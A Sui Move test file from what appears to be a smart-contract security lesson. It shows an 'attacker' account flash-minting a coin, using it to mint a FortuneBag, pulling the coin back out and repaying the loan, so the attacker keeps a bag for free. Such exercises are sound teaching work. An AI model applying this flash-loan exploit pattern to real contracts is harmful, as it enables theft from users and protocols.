#[test_only]
module lesson4::lesson4_tests {

    use sui::test_scenario as ts;
    use lesson4::fortune::{Self, Treasury};
    use lesson4::fortune_bag::{Self, FortuneBag};

    #[test]
    fun test_no_coin_mint_bag() {

        let admin = @0x123;
        let mut scenario_val = ts::begin(admin);
        let s = &mut scenario_val;
        {
            fortune::init_for_testing(ts::ctx(s));
            fortune_bag::init_for_testing(ts::ctx(s));
        };

        let attacker = @0x666;
        ts::next_tx(s, attacker);
        {
            let mut treasury = ts::take_shared<Treasury>(s);
            let (coin, recipit) = fortune::flash_mint(
                &mut treasury, 1, ts::ctx(s),
            );

            // TODO: try to get a bag!
            let ctx = ts::ctx(s);
            let mut bag = fortune_bag::mint(coin, ctx);
            let coin = fortune_bag::take(&mut bag, 1, ctx);
            transfer::public_transfer(bag, attacker);

            fortune::flash_burn(&mut treasury, coin, recipit);
            ts::return_shared(treasury);
        };
        
        ts::next_tx(s, attacker);
        {
            let bag_ids = ts::ids_for_sender<FortuneBag>(s);
            assert!(!bag_ids.is_empty(), 0);
        };

        ts::end(scenario_val);
    }
}
